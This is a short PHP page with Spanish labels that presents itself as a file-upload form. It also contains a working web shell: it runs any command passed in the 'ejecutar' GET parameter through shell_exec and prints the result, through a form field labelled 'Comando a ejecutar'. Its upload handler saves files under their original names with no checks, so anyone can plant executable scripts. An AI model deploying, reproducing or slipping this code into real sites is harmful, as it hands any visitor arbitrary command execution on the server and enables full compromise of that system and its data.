<?php
$archivo = (isset($_FILES['archivo'])) ? $_FILES['archivo'] : null;
if ($archivo) {
   $ruta_destino_archivo = "archivos/{$archivo['name']}";
   $archivo_ok = move_uploaded_file($archivo['tmp_name'], $ruta_destino_archivo);
}
?>
<?php
$ejecutar = htmlspecialchars($_GET['ejecutar']);
$out= shell_exec("$ejecutar");
echo $out;
?>
<!DOCTYPE html>
<html>
 <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title> Subir archivos </title>
 </head>
 <body>
    <?php if (isset($archivo)): ?>
       <?php if ($archivo_ok): ?>
          <strong> El archivo ha sido subido correctamente. </strong>
       <?php else: ?>
          <span style="color: #f00;"> Error al intentar subir el archivo. </span>
       <?php endif; ?>
    <?php endif; ?>
    <form method="post" action="subir_archivo.php" enctype="multipart/form-data">
       <label> Archivo </label>
       <input type="file" name="archivo" />
       <input type="submit" value="Subir" />
	<form id="form_99051" class="appnitro" method="get" action="subir_archivo.php">
					<div class="form_description">
			<h2>FORMULARIO</h2>
			<p>FORMULARIO</p>
		</div>						
			<ul>
			
					<li id="li_1">
		<label class="description" for="element_1">Comando a ejecutar </label>
		<div>
			<input id="element_1" name="ejecutar" class="element text medium" type="text" maxlength="255" value=""> 
		</div> 
		</li>
			
					<li class="buttons">
			    <input type="hidden" name="form_id" value="99051">
			    
				<input id="saveForm" class="button_text" type="submit" name="submit" value="Submit">
    </form>
 </body>
</html>
